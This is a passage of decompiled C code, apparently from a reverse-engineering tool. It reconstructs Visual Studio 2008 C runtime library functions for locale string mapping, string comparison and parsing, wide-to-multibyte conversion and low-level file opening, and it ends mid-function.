// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_00423f0c == 0) {
    BVar1 = GetStringTypeW(1,(LPCWSTR)&DAT_0041cc0c,1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_00423f0c = 2;
      }
      goto LAB_00414b40;
    }
    DAT_00423f0c = 1;
  }
  else {
LAB_00414b40:
    if ((DAT_00423f0c == 2) || (DAT_00423f0c == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_00414c8d;
    }
    if (DAT_00423f0c != 1) goto LAB_00414c8d;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00414c8d;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00414bd0:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_00414bd0;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_00414c8d:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00422ee8) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00422eec) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00422ef0) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00422ef4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00422ef8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00422efc) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00422f00) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00422f04) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00422f08) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00422f0c) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strncmp
// 
// Library: Visual Studio 2008 Release

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte *pbVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  if (_MaxCount != 0) {
    if ((3 < _MaxCount) && (pbVar1 = (byte *)_Str1, pbVar3 = (byte *)_Str2, _MaxCount != 4)) {
      do {
        _Str1 = (char *)(pbVar1 + 4);
        _Str2 = (char *)(pbVar3 + 4);
        if ((*pbVar1 == 0) || (*pbVar1 != *pbVar3)) {
          uVar2 = (uint)*pbVar1;
          uVar4 = (uint)*pbVar3;
          goto LAB_00415052;
        }
        if ((pbVar1[1] == 0) || (pbVar1[1] != pbVar3[1])) {
          uVar2 = (uint)pbVar1[1];
          uVar4 = (uint)pbVar3[1];
          goto LAB_00415052;
        }
        if ((pbVar1[2] == 0) || (pbVar1[2] != pbVar3[2])) {
          uVar2 = (uint)pbVar1[2];
          uVar4 = (uint)pbVar3[2];
          goto LAB_00415052;
        }
        if ((pbVar1[3] == 0) || (pbVar1[3] != pbVar3[3])) {
          uVar2 = (uint)pbVar1[3];
          uVar4 = (uint)pbVar3[3];
          goto LAB_00415052;
        }
        local_8 = local_8 + 4;
        pbVar1 = (byte *)_Str1;
        pbVar3 = (byte *)_Str2;
      } while (local_8 < _MaxCount - 4);
    }
    for (; local_8 < _MaxCount; local_8 = local_8 + 1) {
      if ((*_Str1 == 0) || (*_Str1 != *_Str2)) {
        uVar2 = (uint)(byte)*_Str1;
        uVar4 = (uint)(byte)*_Str2;
LAB_00415052:
        return uVar2 - uVar4;
      }
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
    }
  }
  return 0;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  short *psVar2;
  LPWSTR pWVar3;
  int in_stack_0000001c;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,(localeinfo_struct *)_LocaleName);
  psVar2 = (short *)_CchSrc;
  pWVar3 = _LpDestStr;
  if (0 < (int)_LpDestStr) {
    do {
      pWVar3 = (LPWSTR)((int)pWVar3 + -1);
      if (*psVar2 == 0) goto LAB_004150cf;
      psVar2 = psVar2 + 1;
    } while (pWVar3 != (LPWSTR)0x0);
    pWVar3 = (LPWSTR)0xffffffff;
LAB_004150cf:
    _LpDestStr = (LPWSTR)((int)_LpDestStr + (-1 - (int)pWVar3));
  }
  iVar1 = LCMapStringW(_DWMapFlag,(DWORD)_LpSrcStr,(LPCWSTR)_CchSrc,(int)_LpDestStr,(LPWSTR)_CchDest
                       ,in_stack_0000001c);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



int __cdecl FUN_004150f7(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_00415135:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_004151cc;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_00415207:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00415135;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_004151cc:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_00415207;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2008 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_00415353:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_00415353;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_004153b9;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_004153b9;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_004153b9;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_004153b9:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_00415416:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_00415416;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_00415416;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2008 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  undefined **ppuVar2;
  
  if (DAT_00423c80 == 0) {
    ppuVar2 = &PTR_DAT_00422d60;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_34;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  char local_8;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_34.nLength = 0xc;
  local_34.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_34.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_004155c1;
      }
    }
    else if (uVar4 != 2) goto LAB_0041557d;
    local_c = 0xc0000000;
  }
LAB_004155c1:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_0041557d;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_004156c6;
      if (uVar4 != 0x300) goto LAB_0041557d;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_004156c6:
        local_18 = 5;
        goto LAB_00415675;
      }
      if (uVar4 != 0x700) {
LAB_0041557d:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_00415675:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00423914 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_0041578e;
  }
  *param_1 = 1;
  local_20 = CreateFileA(param_2,local_c,local_14,&local_34,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileA(param_2,local_c,local_14,&local_34,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_0041579a;
    }
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0041578e;
  }
LAB_0041579a:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0041578e;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_00415b0e;
    if ((param_3 & 2) == 0) goto LAB_004158d4;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_004158d4;
    }
    else {
      local_8 = '\0';
      iVar12 = __read_nolock(*in_EAX,&local_8,1);
      if ((((iVar12 != 0) || (local_8 != '\x1a')) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_004158d4;
    }
LAB_00415887:
    __close_nolock(*in_EAX);
    goto LAB_0041578e;
  }
LAB_004158d4:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_00415943;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00415943:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_00415b0e;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_004159a8;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_00415a74;
          }
LAB_0041599f:
